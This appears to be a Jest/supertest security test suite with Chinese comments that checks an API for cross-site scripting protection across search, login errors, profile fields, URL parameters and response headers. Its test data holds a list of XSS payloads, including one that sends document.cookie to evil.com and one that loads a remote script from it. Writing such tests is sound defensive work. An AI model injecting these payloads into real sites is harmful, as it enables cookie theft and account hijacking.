'use strict'

/**
 * P3-8: XSS（跨站脚本攻击）防护测试套件
 *
 * 测试目标：
 * - 验证所有用户输入的XSS防护
 * - 测试输出编码的有效性
 * - 验证Content-Type头的正确设置
 *
 * 测试范围：
 * - 存储型XSS：用户昵称、备注等可存储字段
 * - 反射型XSS：搜索参数、错误消息
 * - DOM型XSS：URL参数
 *
 * 测试方法：
 * - 在输入中注入XSS载荷
 * - 验证响应中载荷被正确编码或过滤
 * - 验证API响应的Content-Type
 *
 * @module tests/security/xss-prevention
 * @since 2026-01-28
 */

// 加载环境变量
require('dotenv').config()

const request = require('supertest')
const app = require('../../app')

describe('P3-8: XSS防护安全测试', () => {
  // 测试超时设置
  jest.setTimeout(30000)

  // 常见XSS载荷
  const xssPayloads = [
    // 基本脚本注入
    '<script>alert("XSS")</script>',
    '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',

    // 事件处理器注入
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')">',
    '<body onload="alert(\'XSS\')">',

    // JavaScript伪协议
    'javascript:alert("XSS")',
    '<a href="javascript:alert(\'XSS\')">click</a>',

    // 编码绕过
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '&#60;script&#62;alert("XSS")&#60;/script&#62;',
    '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',

    // 属性注入
    '" onmouseover="alert(\'XSS\')"',
    "' onclick='alert(1)'",

    // CSS表达式
    '<div style="background:url(javascript:alert(\'XSS\'))">',

    // iframe注入
    '<iframe src="javascript:alert(\'XSS\')">',

    // 复合载荷
    '<ScRiPt>alert("XSS")</sCrIpT>',
    '<scr<script>ipt>alert("XSS")</scr</script>ipt>'
  ]

  describe('API响应Content-Type验证', () => {
    test('所有API响应应设置正确的Content-Type', async () => {
      const endpoints = ['/api/v4/campaigns', '/api/v4/health', '/api/v4/market/listings']

      for (const endpoint of endpoints) {
        const response = await request(app).get(endpoint)

        // Content-Type应该是application/json
        expect(response.headers['content-type']).toMatch(/application\/json/)

        // 不应该是text/html（可能导致浏览器解析XSS）
        expect(response.headers['content-type']).not.toMatch(/text\/html/)
      }

      console.log('[P3-8] API响应Content-Type验证通过')
    })

    test('错误响应也应设置正确的Content-Type', async () => {
      const response = await request(app).get('/api/v4/non-existent-endpoint')

      // 即使是404，也应该返回JSON
      expect(response.headers['content-type']).toMatch(/application\/json/)

      console.log('[P3-8] 错误响应Content-Type验证通过')
    })
  })

  describe('搜索参数XSS防护测试', () => {
    test('搜索参数应正确编码或过滤XSS载荷', async () => {
      for (const payload of xssPayloads.slice(0, 5)) {
        const response = await request(app).get('/api/v4/campaigns').query({ search: payload })

        // 响应中不应该包含未编码的脚本标签
        const responseText = response.text
        expect(responseText).not.toMatch(/<script>/i)
        expect(responseText).not.toMatch(/javascript:/i)
        expect(responseText).not.toMatch(/onerror=/i)
        expect(responseText).not.toMatch(/onload=/i)
      }

      console.log('[P3-8] 搜索参数XSS防护测试通过')
    })

    test('市场搜索应防护XSS', async () => {
      for (const payload of xssPayloads.slice(0, 5)) {
        const response = await request(app)
          .get('/api/v4/market/listings')
          .query({ keyword: payload })

        // 响应中不应该包含可执行的脚本
        expect(response.text).not.toMatch(/<script[^>]*>[^<]*<\/script>/i)
      }

      console.log('[P3-8] 市场搜索XSS防护测试通过')
    })
  })

  describe('错误消息XSS防护测试', () => {
    test('错误消息不应反射用户输入中的XSS载荷', async () => {
      const xssPayload = '<script>alert("XSS")</script>'

      const response = await request(app).post('/api/v4/auth/login').send({
        mobile: xssPayload,
        code: '123456'
      })

      // 错误消息中不应该包含未编码的脚本
      if (response.body.message) {
        expect(response.body.message).not.toMatch(/<script>/i)
      }

      // 整个响应体不应该包含未编码的脚本
      expect(response.text).not.toMatch(/<script>alert\("XSS"\)<\/script>/i)

      console.log('[P3-8] 错误消息XSS防护测试通过')
    })

    test('验证错误不应泄露XSS载荷', async () => {
      const xssPayload = '<img src=x onerror=alert(1)>'

      const response = await request(app).post('/api/v4/auth/login').send({
        mobile: xssPayload,
        code: ''
      })

      // 验证错误中不应该包含未编码的HTML
      expect(response.text).not.toMatch(/<img[^>]*onerror/i)

      console.log('[P3-8] 验证错误XSS防护测试通过')
    })
  })

  describe('用户输入存储XSS防护测试', () => {
    test('用户昵称应防护存储型XSS', async () => {
      // 这个测试验证概念，实际需要认证
      const maliciousNickname = '<script>alert("XSS")</script>'

      // 尝试使用恶意昵称
      const response = await request(app).put('/api/v4/user/profile').send({
        nickname: maliciousNickname
      })

      // 如果请求成功，响应中的昵称应该被编码
      if (response.status === 200 && response.body.data?.nickname) {
        expect(response.body.data.nickname).not.toMatch(/<script>/i)
      }

      console.log('[P3-8] 用户昵称XSS防护概念验证完成')
    })

    test('用户备注应防护存储型XSS', async () => {
      const maliciousRemark = '<img src=x onerror=alert("XSS")>'

      // 尝试使用恶意备注
      const response = await request(app).put('/api/v4/user/profile').send({
        remark: maliciousRemark
      })

      // 响应中不应该包含可执行的HTML
      expect(response.text).not.toMatch(/<img[^>]*onerror/i)

      console.log('[P3-8] 用户备注XSS防护概念验证完成')
    })
  })

  describe('URL参数XSS防护测试', () => {
    test('路径参数应防护XSS', async () => {
      const xssPath = '<script>alert("XSS")</script>'

      const response = await request(app).get(`/api/v4/campaigns/${encodeURIComponent(xssPath)}`)

      // 响应中不应该包含未编码的脚本
      expect(response.text).not.toMatch(/<script>alert\("XSS"\)<\/script>/i)

      console.log('[P3-8] 路径参数XSS防护测试通过')
    })

    test('查询参数应防护XSS', async () => {
      const xssQuery = '<svg onload=alert("XSS")>'

      const response = await request(app).get('/api/v4/campaigns').query({
        page: xssQuery,
        limit: '<script>alert("XSS")</script>'
      })

      // 响应中不应该包含可执行的SVG或脚本
      expect(response.text).not.toMatch(/<svg[^>]*onload/i)
      expect(response.text).not.toMatch(/<script>alert/i)

      console.log('[P3-8] 查询参数XSS防护测试通过')
    })
  })

  describe('JSON响应XSS防护测试', () => {
    test('JSON响应中的字符串应正确转义', async () => {
      // 即使存储了特殊字符，JSON响应也应该正确转义
      const response = await request(app).get('/api/v4/campaigns')

      // 验证响应是有效的JSON
      expect(() => JSON.parse(response.text)).not.toThrow()

      // JSON中的HTML特殊字符应该被正确编码
      const responseJson = JSON.parse(response.text)

      // 递归检查所有字符串值
      const checkXss = obj => {
        if (typeof obj === 'string') {
          // 字符串不应该包含可执行的脚本
          expect(obj).not.toMatch(/<script>/i)
          expect(obj).not.toMatch(/javascript:/i)
        } else if (typeof obj === 'object' && obj !== null) {
          Object.values(obj).forEach(checkXss)
        }
      }

      checkXss(responseJson)

      console.log('[P3-8] JSON响应XSS防护测试通过')
    })
  })

  describe('HTTP头XSS防护测试', () => {
    test('应设置X-Content-Type-Options头', async () => {
      const response = await request(app).get('/api/v4/health')

      // 应该设置nosniff防止MIME类型嗅探
      const xcto = response.headers['x-content-type-options']
      if (xcto) {
        expect(xcto).toBe('nosniff')
      }

      console.log('[P3-8] X-Content-Type-Options头测试完成')
    })

    test('应正确设置X-XSS-Protection头', async () => {
      const response = await request(app).get('/api/v4/health')

      /*
       * 检查XSS保护头
       * 注意：X-XSS-Protection 已被现代浏览器废弃，设置为 "0" 是推荐做法
       * 因为启用此头可能会引入 XSS 漏洞（XSS Auditor 可被绕过）
       * 参考：https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection
       */
      const xss = response.headers['x-xss-protection']
      if (xss) {
        // "0" 表示禁用（推荐）或 "1" 表示启用（旧版兼容）
        expect(['0', '1', '1; mode=block']).toContain(xss)
      }

      console.log('[P3-8] X-XSS-Protection头测试完成')
    })
  })

  describe('特殊字符编码测试', () => {
    test('应正确处理HTML特殊字符', async () => {
      const specialChars = ['< > & " \'', '&lt; &gt; &amp;', '&#60; &#62; &#38;']

      for (const chars of specialChars) {
        const response = await request(app).get('/api/v4/campaigns').query({ search: chars })

        // 响应应该是有效的JSON
        expect(() => JSON.parse(response.text)).not.toThrow()
      }

      console.log('[P3-8] 特殊字符编码测试通过')
    })

    test('应正确处理Unicode字符', async () => {
      const unicodePayloads = [
        '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
        '\x3cscript\x3ealert("XSS")\x3c/script\x3e'
      ]

      for (const payload of unicodePayloads) {
        const response = await request(app).get('/api/v4/campaigns').query({ search: payload })

        // 响应中不应该包含解码后的脚本
        expect(response.text).not.toMatch(/<script>alert\("XSS"\)<\/script>/i)
      }

      console.log('[P3-8] Unicode字符编码测试通过')
    })
  })

  describe('复合XSS攻击测试', () => {
    test('应防护大小写混淆绕过', async () => {
      const mixedCasePayloads = [
        '<ScRiPt>alert("XSS")</sCrIpT>',
        '<SCRIPT>alert("XSS")</SCRIPT>',
        '<ScRiPt SrC="http://evil.com/xss.js"></ScRiPt>'
      ]

      for (const payload of mixedCasePayloads) {
        const response = await request(app).get('/api/v4/campaigns').query({ search: payload })

        // 不应该包含任何形式的script标签
        expect(response.text.toLowerCase()).not.toMatch(/<script[^>]*>/i)
      }

      console.log('[P3-8] 大小写混淆绕过测试通过')
    })

    test('应防护嵌套标签绕过', async () => {
      const nestedPayloads = [
        '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
        '<<script>script>alert("XSS")</script>'
      ]

      for (const payload of nestedPayloads) {
        const response = await request(app).get('/api/v4/campaigns').query({ search: payload })

        // 不应该包含可执行的脚本
        expect(response.text).not.toMatch(/<script>alert\("XSS"\)<\/script>/i)
      }

      console.log('[P3-8] 嵌套标签绕过测试通过')
    })
  })
})
